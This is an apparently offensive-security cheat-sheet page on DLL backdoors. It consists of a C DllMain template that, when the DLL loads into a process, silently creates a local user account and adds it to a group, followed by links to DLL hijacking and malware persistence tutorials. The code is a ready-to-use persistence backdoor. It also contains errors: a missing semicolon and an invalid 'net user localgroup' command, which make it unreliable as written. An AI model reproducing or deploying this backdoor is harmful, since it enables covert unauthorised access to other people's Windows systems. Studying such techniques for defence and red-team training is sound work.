# DLL Backdoors

## 01 - Manual

```c
#include <stdlib.h>
#include <windows.h>

BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,
    DWORD fdwReason,
    LPVOID lpReserved) {
    switch(fdwReason) { 
        case DLL_PROCESS_ATTACH:
         system("cmd /c net user <username> <password> /add /y & net user localgroup \"<group_name>\" \"<username>\" /add /y")
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
        case DLL_PROCESS_DETACH:
            break;
    }

    return TRUE;  
}
```

---
## References

### TBHaxor

- [TBHaxor: Loading DLLs Using CPP in Windows](https://tbhaxor.com/loading-dlls-using-cpp-in-windows/)

### Cocomelonc

- [Cocomelonc: Malware Persistence Part 3](https://cocomelonc.github.io/tutorial/2022/05/02/malware-pers-3.html)

### Elliot on Security

- [Elliot on Security: Perfect DLL Hijacking](https://elliotonsecurity.com/perfect-dll-hijacking/)